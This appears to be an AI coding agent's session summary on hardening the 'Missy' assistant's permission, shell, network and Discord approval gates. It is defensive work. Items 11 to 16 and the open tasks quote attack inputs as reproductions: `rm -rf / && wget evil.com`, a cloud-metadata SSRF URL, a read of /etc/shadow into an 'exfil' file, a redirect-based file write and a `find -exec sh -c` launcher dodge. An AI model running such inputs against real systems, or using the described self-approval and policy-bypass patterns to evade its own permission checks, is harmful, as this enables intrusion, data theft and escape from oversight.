# LAST_SESSION_SUMMARY

Date: 2026-07-10

Branch: `overhaul/missy-validation-20260710-031406`
Draft PR: https://github.com/MissyLabs/missy/pull/31

## Changed (16 checkpoints this session, full suite green after every one)

1. Preserved/hardened the existing `voice_commands.py` fix; fixed a real
   trailing-comma leak bug the new regression tests caught.
2. **FX-A**: forced the acpx delegate provider through Missy's
   structured tool protocol (zero native tools, fail-closed permissions,
   isolated cwd, config-can't-override sanitization, delegation
   envelope, leaked-marker defense). Dominant root cause behind ~30 of
   43 failing validation cases.
3. **FX-B**: fixed the production memory backend mismatch — Discord
   conversation turns were being written to the wrong file. Found the
   identical bug independently in `VisionMemoryBridge`.
4. **FX-E + SR-1.2/1.3 (critical)**: closed a live, unauthenticated
   code-self-approval vulnerability (default system prompt taught
   self-approval; a second instance let any Discord user approve via
   emoji reaction).
5. **SR-1.12 (critical)**: closed an unauthenticated Discord DM-pairing
   self-approval bypass (any unpaired stranger, two messages, zero auth).
6. **FX-D**: explicit structural current-turn boundary in the acpx
   prompt + fail-closed on totally fabricated delegate responses.
7. **SR-1.13 (critical, two findings)**: Discord message-command and
   slash-command ingress both lacked proper authorization; the latter
   also had a cross-user session-bleeding bug (`session_id="discord"`
   hardcoded for every user).
8. **FX-C**: grounded memory-ID lookups (exception vs. genuinely
   missing); confirmed and locked in with tests that Incus tools are
   fabrication-proof at the tool layer; added an explicit envelope rule
   against padding/altering structured tool results.
9. **FX-F bullet 1**: browser error classification (tool absence vs.
   installation vs. sandbox/kernel failure vs. real interaction error),
   live-verified against this dev sandbox's actual missing-playwright
   state.
10. **FX-G**: safe upper bound on acpx timeout config + explicit
    "outcome is UNKNOWN, verify before retry, make retries idempotent"
    timeout messaging. Attempted process-group cleanup on timeout too,
    but reverted after it broke ~136 existing tests (mocks target
    `subprocess.run`, the fix needed `subprocess.Popen`) — tracked as
    task #17 for a dedicated session.
11. **SR-1.8**: found and fixed a fifth critical finding —
    `ShellPolicyEngine.check_command()` treated an empty
    `allowed_commands` list as allow-all whenever `shell.enabled: true`,
    directly contradicting `ShellPolicy`'s own docstring and every piece
    of operator-facing documentation, all of which already correctly
    promised deny-all. A pre-existing test literally asserted
    `rm -rf / && wget evil.com` passed policy under that exact default
    config. Fixed the implementation to match its own documented
    contract; no doc changes needed.
12. **SR-1.5 (sixth critical finding)**: fixed the review's
    "architectural finding" pattern for Incus tools —
    `ToolRegistry._check_permissions()` derived the checked shell
    command from a generic `command` kwarg that 14 of 15 Incus tools
    don't have (checking the meaningless literal `"shell"` instead of
    the real `incus` binary), and `incus_exec`'s `command` kwarg names
    the *guest* command, not the host binary. Live-reproduced
    end-to-end: with `allowed_commands=["bash"]`,
    `incus_exec(command="bash")` passed policy and executed the real
    host `incus exec ... -- bash -c bash`, despite `incus` never being
    allowlisted. Also fixed: `incus_file`'s `host_path` was never
    checked against the filesystem policy at all (declared `shell=True`
    only). Fixed generally via two new optional `BaseTool` hooks
    (`resolve_shell_command`, `resolve_filesystem_targets`) rather than
    special-casing Incus — any first-party tool can now declare its real
    operation instead of relying on a kwarg-name heuristic that several
    tools' actual kwargs don't match. Verified zero behavior change for
    tools that don't opt into the new hooks.
13. **SR-1.6 (seventh critical finding, crown-jewel bypass)**:
    `BrowserNavigateTool` called Playwright's `page.goto(url)` directly
    with zero routing through `PolicyHTTPClient` or the network policy
    engine — the sole exception among network-permission tools
    (`web_fetch`/Discord upload both route through `PolicyHTTPClient`).
    The registry also had no dynamic host-checking mechanism for network
    permissions at all (only a static, always-empty `allowed_hosts`
    list). Live-reproduced: with nothing allowlisted,
    `browser_navigate(url="http://169.254.169.254/latest/meta-data/")`
    — the cloud-metadata SSRF target the review names explicitly —
    passed the registry's permission check with zero denial. Fixed with
    two layers: (1) a `resolve_network_hosts()` `BaseTool` hook
    (reusing SR-1.5's hook pattern) that lets `BrowserNavigateTool`
    declare its real target host, checked by the registry before
    Playwright is ever touched; (2) a Playwright
    `context.route("**/*", ...)` interceptor registered on every
    browser session that gates *every* request — navigation, redirects,
    subresources, and JS-triggered `fetch()`/XHR via `browser_evaluate`
    — against the same policy engine, closing the part of the finding
    ("every subresource/redirect/fetch inside Firefox is outside the
    Python gateway too") a top-level-only check would have missed.
14. **SR-1.4 (eighth critical finding)**: the same architectural pattern
    as SR-1.5, in the tools the review names explicitly —
    `VisionCaptureTool` declared `filesystem_read=True,
    filesystem_write=True` but reads its target from `source` and
    writes to `save_path` (also reads `device`), none matching the
    registry's generic kwarg heuristic, so the permissions enforced
    nothing. Live-reproduced: with nothing filesystem-allowlisted,
    `vision_capture(source="/etc/shadow", save_path="/tmp/exfil.jpg")`
    passed the registry's check with zero denial and the tool actually
    called `cv2.imread("/etc/shadow")` — failed only because the file
    isn't a valid image, not because of any policy gate. Fixed by
    reusing SR-1.5's `resolve_filesystem_targets()` hook — no new
    mechanism needed. `VisionBurstCaptureTool` fixed the same way,
    correctly declaring a write target only in its `best_only=True`
    branch (the only branch that actually calls `cv2.imwrite`).
15. **SR-1.9a (ninth critical finding)**:
    `NetworkPolicyEngine.check_host()`'s exact-hostname
    (`allowed_hosts`) and domain-suffix (`allowed_domains`) matches
    returned `allow` immediately with **zero IP verification** — the
    DNS-rebinding defense (deny if a resolved address is
    private/loopback/link-local and not covered by `allowed_cidrs`)
    only ran for hostnames matching neither list. Two pre-existing
    tests explicitly asserted this as correct
    (`test_exact_host_match_does_not_call_dns`,
    `test_domain_match_does_not_call_dns`) — the same "vulnerable
    behavior encoded as a passing test" pattern as SR-1.8.
    Live-reproduced: with a fake resolver configured to raise
    `AssertionError` if ever invoked, an allowlisted hostname passed
    `check_host()` with the resolver never called at all. Fixed by
    extracting the existing rebinding-check logic into a shared
    `_resolve_and_check_rebinding()` helper applied uniformly to all
    three matching paths. **Caught and fixed a real test-suite
    performance regression from this fix in the same checkpoint:** 6
    Hypothesis property tests generate random allowlisted hostnames
    without mocking DNS, which (correctly, but expensively) now each
    perform a real DNS lookup per example — pushed
    `tests/policy/+gateway/+security/` from 76s to 383s; fixed by
    mocking DNS in those 6 tests, matching this file's own
    already-established pattern for its deny-path tests. Also found
    and fixed one real full-suite failure: a test using the literal
    hostname `"internal.corp.com"` as an allowlisted host, which
    genuinely resolves via live DNS in this sandbox to ICANN's
    name-collision warning sentinel (a loopback address), correctly
    triggering the new check — fixed by mocking DNS there too, removing
    an unintended live-network dependency the test was never meant to
    have.
16. **SR-1.7 (tenth critical finding)**: `ShellPolicyEngine` only ever
    validated program names — redirection operators (`>`, `>>`, `<`)
    were never parsed or routed through `FilesystemPolicyEngine` at
    all. Live-reproduced through the real, unmocked production
    `shell_exec` tool via `ToolRegistry`: with only `"echo"`
    allowlisted and no write paths allowlisted,
    `shell_exec(command="echo pwned > /tmp/.../pwn.txt")` returned
    `success: True` and **the file was genuinely created on disk** —
    an unrestricted arbitrary-file-write primitive available through
    any config permitting even one innocuous command. Fixed:
    `ShellPolicyEngine.extract_redirect_targets()` tokenises with
    POSIX-punctuation-aware `shlex` so operators are recognised with or
    without whitespace (closing a naive-scanner dodge), excluding
    fd-duplication forms (`2>&1`); `PolicyEngine.check_shell()` routes
    every target through the filesystem engine. Live-verified the
    reproduction is now denied and the file is never created. **Bug
    found and fixed in the same checkpoint:** the pre-existing
    chain-splitting regex misparsed `2>&1`/`>&2`/`<&0` as background
    execution, denying the common `2>&1` idiom outright even with the
    command allowlisted — confirmed pre-existing via `git stash`,
    fixed with a negative lookbehind.

**Ten independent, confirmed critical vulnerabilities** found and fixed
this session (SR-1.2/1.3, SR-1.12, SR-1.13 ×2, SR-1.8, SR-1.5, SR-1.6,
SR-1.4, SR-1.9a, SR-1.7). Five are the "missing gate before a side
effect" pattern; three (SR-1.5, SR-1.6, SR-1.4) are declared tool
metadata not matching the operation actually performed, with the
`resolve_*` hook mechanism generalizing cleanly across all three;
SR-1.9a is a security check applied asymmetrically; SR-1.7 is a
narrower-than-declared enforcement scope (checking the program name but
not everything that name's execution can actually touch). Plus the
FX-A/B/C/D/F/G validation-harness root causes.

**All of FX-A through FX-G are now done** per the prompt's stated
dependency order (some with residual/deferred sub-items tracked as
separate tasks — see below).

## Verification

```text
python3 -m pytest tests/ -q -o faulthandler_timeout=120 \
  --deselect tests/vision/test_discovery_capture_sysfs.py::TestCacheTTL::test_cache_valid_within_ttl \
  --deselect tests/vision/test_discovery_edge_cases.py::TestPermissionDeniedOnDevice::test_device_that_does_not_exist_is_skipped \
  --deselect tests/vision/test_discovery_edge_cases.py::TestRapidAddRemove::test_cached_results_returned_within_ttl
20832 passed, 13 skipped, 3 deselected in 472.05s (0:07:52)
```

Full detail in `BUILD_STATUS.md`, `AUDIT_SECURITY.md`, and
`TEST_RESULTS.md` — each has one dated entry per checkpoint this
session, oldest at the bottom, nothing overwritten.

## Open tasks (session-tracked, carry into next session)

- **#9** SR-1.x through SR-4.x security review remediation — most of
  it. This session covered SR-1.2/1.3, SR-1.4, SR-1.5, SR-1.6, SR-1.7,
  SR-1.8, SR-1.9a, SR-1.12, SR-1.13 (plus SR-3.1 substantially via
  FX-B). SR-1.1, SR-1.9b (the harder DNS TOCTOU sub-finding), SR-1.10,
  SR-1.11, SR-2.x, SR-3.2 through SR-3.5, SR-4.x remain.
- **#10** Full 89-case tool-specific validation backlog — not yet
  re-run against current code.
- **#11** Pre-existing vision `CameraDiscovery` cache-TTL flake (3
  tests) — confirmed present before this session's changes, unrelated,
  small isolated fix needed in `missy/vision/discovery.py`.
- **#12** Wire an authenticated Discord pairing approval endpoint —
  the SR-1.12 fix removed the vulnerable path but pairing currently has
  *no* working approval surface at all.
- **#15** `allowed_roles` Discord config field documented but never
  enforced.
- **#16** FX-F bullets 2/4: build an actual disposable, threat-modeled
  browser-test environment and rerun WB-002 through WB-007 + XT-001
  against it. This dev sandbox cannot launch a browser at all (no
  playwright installed) — confirmed live, matching the harness's own
  observation.
- **#17** FX-G process-group cleanup on acpx timeout — implementation
  works but needs the test-suite migration from mocking
  `subprocess.run` to `subprocess.Popen` done carefully in its own
  session.
- **New this checkpoint:** SR-1.7's launcher sub-finding remains open —
  `find`/`xargs`/`bash`/`sudo` etc. are allowlist-able with only a
  warning, and nested shell commands inside a launcher's quoted
  arguments are structurally invisible to any static command-string
  parser (confirmed by inspection: `find . -exec sh -c 'echo x > file'
  \;` tokenises the quoted argument as one opaque string). This is a
  product-policy decision (block launchers outright vs. runtime
  interception), not a mechanical bug fix — needs explicit product
  input before implementing.
- SR-1.9b (DNS TOCTOU requiring attacker-controlled low-TTL DNS) is
  real but substantially harder — would need connecting to a pinned,
  policy-verified IP rather than re-resolving at connect time, a larger
  change touching the gateway client itself.
- **Lesson from SR-1.9a's checkpoint, worth remembering for future
  policy-engine changes:** a security fix that adds real DNS/network
  calls to a previously-synchronous/local code path can silently turn
  into a major test-suite performance regression if fixture hostnames
  aren't mocked — always time the affected test directories before/after
  and grep for realistic-looking hostnames used as allowlist entries in
  tests before considering such a change done.

## The single biggest remaining gap

**None of this session's fixes have been validated against a real or
scripted acpx delegate invocation.** All verification so far is
unit/integration-level with mocks, or against the real (but
non-LLM-calling) acpx binary for `--version`/`--help`. FX-A bullet 6
("prove end to end that representative filesystem, shell, browser,
X11, AT-SPI, vision, audio, Discord upload, memory, self_create_tool,
and code_evolve requests produce the expected registry, policy, and
audit events") is still fully open, and it's the prerequisite for
re-running most of the 89-case validation backlog with real evidence
rather than code-level reasoning about what *should* happen.

## First Next Step

If a way to safely exercise a real or scripted acpx delegate call
becomes available, prioritize FX-A bullet 6 — it unblocks re-validating
everything else. Otherwise, the SR-1.x sweep has now covered every
"wired & reachable" §1 finding from the review except SR-1.1 (audit
signing — a larger, cross-cutting change), SR-1.9b (DNS TOCTOU), and
SR-1.10/SR-1.11 (audit-secrets-redaction, MCP manifest pinning) — those,
or §2/§3/§4 (unattended-execution hazards, data-integrity/availability,
dead/unwired features) are the natural next targets. Alternatively pick
up one of the concrete scoped tasks above (#11, #12, #15, #16, #17),
all self-contained and not requiring a live delegate.
